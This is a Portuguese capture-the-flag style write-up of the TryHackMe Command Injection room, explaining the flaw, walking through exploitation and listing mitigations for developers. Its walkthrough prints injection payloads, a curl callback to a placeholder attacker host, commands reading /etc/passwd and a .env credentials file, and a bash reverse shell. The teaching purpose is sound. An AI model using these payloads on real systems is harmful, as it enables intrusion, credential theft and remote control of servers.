# Write-up: TryHackMe — Command Injection

**Plataforma:** TryHackMe  
**Sala:** Command Injection — Cybersecurity 101 / Web Hacking  

---

## 1. Introdução e objetivos da sala

A sala **Command Injection** demonstra como aplicações que passam entradas do usuário diretamente a comandos do sistema operacional podem permitir a execução remota de comandos arbitrários. O objetivo é identificar vetores de injeção, explorar com payloads simples e mostrar como mitigar a falha em aplicações web.

Objetivos:
- Entender por que chamar comandos do SO com entradas não confiáveis é perigoso.
- Explorar técnicas de injeção (inline commands, `;`, `&&`, backticks, `$()`).
- Praticar a exploração em um ambiente controlado e descrever mitigação e prevenção.

---

## 2. Ferramentas utilizadas

* Navegador + DevTools — inspecionar requests/params.  
* Burp Suite / proxy (opcional) — interceptar e modificar requisições.  
* Terminal / AttackBox — receber callbacks com `nc -lvp` e testar payloads com `curl`.  
* `curl`, `wget` — testar endpoints, enviar payloads.  

---

## 3. Conceito rápido

**Command Injection** ocorre quando um servidor constrói uma linha de comando do sistema operacional concatenando strings que incluem dados controlados pelo usuário e, em seguida, a executa (por exemplo `system()`, `exec()`, `passthru()` em PHP). Um atacante injeta operadores ou subcomandos para executar instruções arbitrárias.

Formas comuns de injetar:
- Separadores de comando: `;`, `&&`, `||`  
- Substituição inline: `` `command` `` ou `$(command)`  
- Redirecionamentos e pipes para ler/alterar arquivos: `>`, `>>`, `|`

---

## 4. Walkthrough / Metodologia (exemplo prático)

> Cenário típico: aplicação com parâmetro `cow` ou `name` que é passado para `cowsay` usando `passthru()` (PHP) ou `system()`.

### 1) Identificar o vetor
- Encontrar input que é refletido/executes server-side. Ex.: `GET /cowsay?text=hello`.
- Testar payloads inofensivos para ver comportamento (caractere especial `;` pode quebrar a saída).

### 2) Teste rápido com payloads
- Teste básico:
```
; whoami
```
ou
```
$(whoami)
```
- Se o site passa o parâmetro direto para o comando, o retorno do `whoami` aparece na resposta ou no output do processo, indicando vulnerabilidade.

### 3) Capturar callback (quando payload causa request externo)
- Suba um listener: `nc -lvp 9001`.
- Injete payload que faça request ao seu host:  
```
; curl http://YOUR_IP:9001/$(whoami)
```
- O servidor fará a requisição e seu listener verá a tentativa, confirmando execução remota.

### 4) Escala e exploração prática
- Ler arquivos sensíveis: `; cat /etc/passwd`  
- Buscar credenciais: `; cat /var/www/.env`  
- Obter shell reverso (apenas em lab): criar payload para `bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1` ou usar `nc` reverso se disponível.

> Sempre documente os passos, comandos executados e evidências (respostas, flags, captura do listener).

---

## 5. Mitigações recomendadas (para desenvolvedores)

1. **Evite chamar o shell** — prefira APIs nativas do idioma (bibliotecas) para realizar tarefas (por exemplo, manipular arquivos em vez de rodar `cat` via shell).  
2. **Whitelist de comandos / argumentos** — se for necessário executar comandos, valide estritamente os valores permitidos.  
3. **Escape adequado** — use funções de escaping específicas da plataforma (ex.: `escapeshellarg`, `escapeshellcmd` em PHP) — mas prefira evitar por completo.  
4. **Princípio de menor privilégio** — processos que executam comandos não devem rodar como root.  
5. **Input validation & normalization** — rejeitar caracteres perigosos ou patterns suspeitos.  
6. **Logging e monitoramento** — auditar execuções de comandos, bloquear padrões anômalos e alertar.  

---

## 6. Lições aprendidas e conclusão

Command Injection ilustra a regra de ouro: nunca confiar em dados controlados pelo usuário. Em contextos de backend/Node/Java/JavaScript, evite executar comandos shell com inputs diretos — prefira bibliotecas e funções internas. Para devs, este write-up demonstra como testar, comprovar a falha e escrever recomendações práticas para remediação.

---
